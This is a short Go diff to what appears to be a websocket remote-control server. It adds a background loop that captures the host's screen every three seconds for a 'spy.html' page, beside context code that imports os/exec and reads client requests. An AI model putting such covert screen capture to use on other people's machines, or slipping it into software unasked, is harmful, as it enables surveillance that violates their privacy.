@@ -7,6 +7,7 @@ import (
 	"strings"
 	"os/exec"
 	"github.com/gorilla/websocket"
+	"time"
 	"./util"
 
 	b64 "encoding/base64"
@@ -22,9 +23,7 @@ func main() {
 		var conn, _ = upgrader.Upgrade(w, r, nil)
 		fmt.Println("Client connection")
 
-		// Send dashboard info (index.html)
-
-		// Accept execute requests (cmd.html)
+		// Accept websocket requests (loop)
 		go func(conn *websocket.Conn) {
 			for {
 				_, p, err := conn.ReadMessage()
@@ -46,6 +45,14 @@ func main() {
 				
 			}
 		}(conn)
+
+		// Continually capture screenshots for spy.html
+		go func(interval time.Duration) {
+			for {
+				time.Sleep(3 * time.Second)
+				util.CaptureScreen()
+			}
+		}(3)
 
 	})
 	fmt.Println("Server started")
